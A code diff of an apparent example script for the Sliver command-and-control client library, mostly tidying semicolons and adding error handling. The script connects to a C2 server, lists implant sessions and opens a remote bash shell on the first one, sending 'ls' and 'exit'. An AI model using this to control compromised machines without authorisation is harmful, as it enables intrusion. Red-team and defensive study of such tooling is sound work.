@@ -1,41 +1,54 @@
-import { SliverClient } from '../../src/client';
-import { ParseConfigFile } from '../../src/config';
+import { SliverClient } from '../../src/client'
+import { ParseConfigFile } from '../../src/config'
 
 // Use this import when using the NPM module, and remove the relative imports above:
 // import { SliverClient, ParseConfigFile } from 'sliver-script';
 
-import * as os from 'os';
-import * as path from 'path';
+import * as os from 'os'
+import * as path from 'path'
+import * as tls from 'tls'
+import * as fs from 'fs'
 
 
-const DEFAULT_CONFIG_PATH = path.join(os.homedir(), '.sliver-client', 'configs', 'default.cfg');
+const DEFAULT_CONFIG_PATH = path.join(os.homedir(), '.sliver-client', 'configs', 'default.cfg')
 const SLIVER_CONFIG_FILE = process.env['SLIVER_CONFIG_FILE'] || DEFAULT_CONFIG_PATH;
 
 
 (async () => {
-    console.log(`Loading config: ${SLIVER_CONFIG_FILE}`);
-    const config = await ParseConfigFile(SLIVER_CONFIG_FILE);
-    const client = new SliverClient(config);
+    console.log(`Loading config: ${SLIVER_CONFIG_FILE}`)
+    const config = await ParseConfigFile(SLIVER_CONFIG_FILE)
+    const client = new SliverClient(config)
 
-    console.log(`Connecting to ${config.lhost} ...`);
-    await client.connect();
-    const sessions = await client.sessions();
+    console.log(`Connecting to ${config.lhost} ...`)
+    try {
+        await client.connect()
+    } catch (err) {
+        console.error(err)
+        process.exit(9)
+    }
+
+    
+    const sessions = await client.sessions()
+    if (!sessions) {
+        console.error(`No sessions found`)
+        process.exit(3)
+    }
     console.log(sessions);
     if (0 < sessions.length) {
-        const interact = await client.interactWith(sessions[0]);
-        const shell = await interact.shell('/bin/bash', true);
+        const interact = await client.interactWith(sessions[0])
+        const shell = await interact.shell('/bin/bash', true)
         shell.stdout.subscribe(data => {
-            process.stdout.write(data);
+            process.stdout.write(data)
         }, (err) => {
-            console.error(err);
+            console.error(err)
         }, () => {
-            console.log('tunnel closed');
+            console.log('tunnel closed')
         });
-        shell.stdin.next(Buffer.from('ls\n'));
-        shell.stdin.next(Buffer.from('exit\n'));
-        setTimeout(() => { process.exit(0) }, 5000);
+        shell.stdin.next(Buffer.from('ls\n'))
+        shell.stdin.next(Buffer.from('exit\n'))
+        setTimeout(() => { process.exit(0) }, 1000)
     } else {
-        console.log('No sessions');
-        process.exit(0);
+        console.log('No sessions')
+        process.exit(0)
     }
-})();
+})()
